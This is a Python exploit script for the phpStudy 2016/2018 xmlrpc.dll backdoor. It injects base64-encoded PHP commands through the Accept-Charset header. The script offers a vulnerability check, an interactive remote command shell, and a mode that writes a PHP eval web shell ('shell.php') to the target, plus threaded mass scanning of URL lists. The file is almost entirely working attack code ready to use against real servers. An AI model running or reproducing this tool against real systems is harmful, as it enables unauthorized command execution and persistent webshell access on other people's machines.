# coding:utf-8
# Author:yongz
# Description:phpstudy 2016/2018 xmlrpc.dll backdoor rce
# Date:2023-2-19



import requests
import queue
import base64
import optparse
import threading
import datetime

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
    'Accept-Encoding': 'gzip,deflate',
    'Accept-Language': 'zh-CN,zh;q=0.9',
}


lock = threading.Lock()

q0 = queue.Queue()
threadList = []
global succ
succ = 0

def checkPhpstudyBackdoor(tgtUrl,timeout):

    headers['Accept-Charset'] = 'ZXhpdCgnV3JpN2VUaDNXMHJsZCcpOw=='
    # ZXhpdCgnV3JpN2VUaDNXMHJsZCcpOw==  ->  exit('Wri7eTh3W0rld'); 无意义字符串判断是否执行成功。

    rsp = requests.get(tgtUrl,headers=headers,verify=False,timeout=timeout)
    # verify=False 移除 SSL 认证

    rsp.encoding='utf-8'

    if "Wri7eTh3W0rld" in rsp.text:
        return True
    else:
        return False


def checkPhpstudyBackdoorBatch(timeout, doorSuccess):

    headers['Accept-Charset'] = 'ZXhpdCgnV3JpN2VUaDNXMHJsZCcpOw=='
    global countLines
    while (not q0.empty()):

        tgtUrl = q0.get()
        qcount = q0.qsize()
        print ('Checking: ' + tgtUrl + ' ---[' + str(countLines - qcount) + '/' + str(countLines) + ']')

        try:
            rst = requests.get(tgtUrl, headers=headers, timeout=timeout, verify=False)
        except requests.exceptions.Timeout:
            continue
        except requests.exceptions.ConnectionError:
            continue
        except:
            continue

        if rst.status_code == 200 and ("Wri7eTh3W0rld" in rst.text):
            print ('Target is vulnerable!!!---' + tgtUrl + '\n')
            lock.acquire()
            doorSuccess.write('Target is vulnerable!!!---' + tgtUrl + '\n')
            lock.release()
            global succ
            succ = succ + 1

        else:
            continue



def getCmdShellPhpstudyBackdoor(tgtUrl,timeout):

    while True:
        command = input("cmd>>> ")
        if command == 'exit':
            break

        command = "system(\"" + command + "\");"
        command.encode('utf-8')
        command = base64.b64encode(command.encode('utf-8'))
        headers['Accept-Charset'] = command
        cmdResult = requests.get(tgtUrl, headers=headers, verify=False,timeout=7)

        cmdResult.encoding='gbk'
        #因为 phpStudy 只有 Windows 版存在漏洞，Windows 系统使用的是 GBK 编码。

        if cmdResult.text.split('<!')[0] == '':
            print('Command Error!')
        else:
            print (cmdResult.text.split('<!')[0])



def phpstudyBackdoorGetshell(tgtUrl,timeout):

    # 将一句话木马写入进 phpinfo.php 文件
    b64exp = "system(' ECHO ^<?php @eval($_REQUEST[cmd]); ?^> >> ./shell.php');"
    b64exp = base64.b64encode(b64exp.encode('utf-8'))
    headers['Accept-Charset'] = b64exp

    rsp = requests.get(tgtUrl,headers=headers,verify=False,timeout=timeout)

    # 写入成功执行如下命令
    if rsp.status_code == 200:
        # 发送请求访问 shell.php 文件
        backDoorUrl = tgtUrl + '/shell.php'
        rsp1 = requests.get(backDoorUrl,verify=False,timeout=timeout)
        b64poc = "system('dir');"
        b64poc = base64.b64encode(b64poc.encode('utf-8'))
        headers['Accept-Charset'] = b64poc

        rsp2 = requests.get(tgtUrl,headers=headers,verify=False,timeout=timeout)
        rsp2.encoding='gbk'
        # 如果存在 shell.php 文件则说明木马写入成功，之所以这么判断是因为文件上传路径无法确定，原先脚本就是访问不到文件显示 404，这里进行了一些改进
        if "shell.php" in rsp2.text:
            print ('shell.php 创建成功！\n\n请使用 --cmd 查看文件路径并将后门文件迁移至 WWW 目录下\n')
            print ('命令如下：\nchdir        # 查看目录路径\ncopy shell.php xxxx/WWW        # 迁移文件')
        else:
            print ('shell.php 创建失败！')
    else:
        print ('Request Error!')


if __name__ == '__main__':
    print ('''
        _          ____  _             _         ____             _    ____                     ____   ____ _____ 
  _ __ | |__  _ __/ ___|| |_ _   _  __| |_   _  | __ )  __ _  ___| | _|  _ \  ___   ___  _ __  |  _ \ / ___| ____|
 | '_ \| '_ \| '_ \___ \| __| | | |/ _` | | | | |  _ \ / _` |/ __| |/ / | | |/ _ \ / _ \| '__| | |_) | |   |  _|  
 | |_) | | | | |_) |__) | |_| |_| | (_| | |_| | | |_) | (_| | (__|   <| |_| | (_) | (_) | |    |  _ <| |___| |___ 
 | .__/|_| |_| .__/____/ \__|\__,_|\__,_|\__, | |____/ \__,_|\___|_|\_\____/ \___/ \___/|_|    |_| \_\\____|_____|
 |_|         |_|                         |___/       by yongz                                                             
        ''')
    #创建一个OPtionParser 对象
    parser = optparse.OptionParser('python %prog ' + '-h (manual)', version='%prog v1.0')

    #添加命令行参数
    parser.add_option('-u', dest='tgtUrl', type='string', help='single url')
    parser.add_option('-f', dest='tgtUrlsPath', type='string', help='urls filepath[exploit default]')
    parser.add_option('-s', dest='timeout', type='int', default=7, help='timeout(seconds)')
    parser.add_option('-t', dest='threads', type='int', default=5, help='the number of threads')

    parser.add_option('--get', dest='getshell',action='store_true', help='get webshell')
    parser.add_option('--cmd', dest='cmdshell',action='store_true', help='cmd shell mode')


    #解析传入的命令行参数
    (options, args) = parser.parse_args()

    # check = options.check
    timeout = options.timeout
    tgtUrl = options.tgtUrl
    getshell = options.getshell
    cmdshell = options.cmdshell


    # python phpStudyBackDoor.py -u "http://192.168.80.128"
    if tgtUrl and (cmdshell is None) and (getshell is None):
        if(checkPhpstudyBackdoor(tgtUrl,timeout)):
            print ('Target is vulnerable!!!' + '\n')
        else:
            print ('Target is not vulnerable.' + '\n')

    # python phpStudyBackDoor.py -u "http://192.168.80.128" --cmd
    if tgtUrl and cmdshell and (getshell is None):
        if (checkPhpstudyBackdoor(tgtUrl,timeout)):
            print ('Target is vulnerable!!! Entering cmdshell...' + '\n')
            getCmdShellPhpstudyBackdoor(tgtUrl,timeout)
        else:
            print ('Target is not vulnerable.' + '\n')
            pass

    # python phpStudyBackDoor.py -u "http://192.168.80.128" --get
    if tgtUrl and (cmdshell is None) and getshell:
        phpstudyBackdoorGetshell(tgtUrl,timeout)

    # python phpStudyBackDoor.py -u "http://192.168.80.128" -f url.txt
    if options.tgtUrlsPath:
        tgtFilePath = options.tgtUrlsPath
        threads = options.threads
        # 获取当前时间
        nowtime = datetime.datetime.now().strftime('%Y%m%d%H%M%S')

        doorSuccess = open(str(nowtime) + '_' + 'success.txt', 'w')
        urlsFile = open(tgtFilePath)
        global countLines
        countLines = len(open(tgtFilePath, 'r').readlines())

        print ('===Total ' + str(countLines) + ' urls===')

        for urls in urlsFile:
            fullUrls = urls.strip()
            q0.put(fullUrls)
        for thread in range(threads):
            t = threading.Thread(target=checkPhpstudyBackdoorBatch, args=(timeout, doorSuccess))
            t.start()
            threadList.append(t)
        for th in threadList:
            th.join()

        print ('===Finished! [success/total]: ' + '[' + str(succ) + '/' + str(countLines) + ']===')
        print ('Results were saved in current path: ' + str(nowtime) + '_success.txt')
        doorSuccess.close()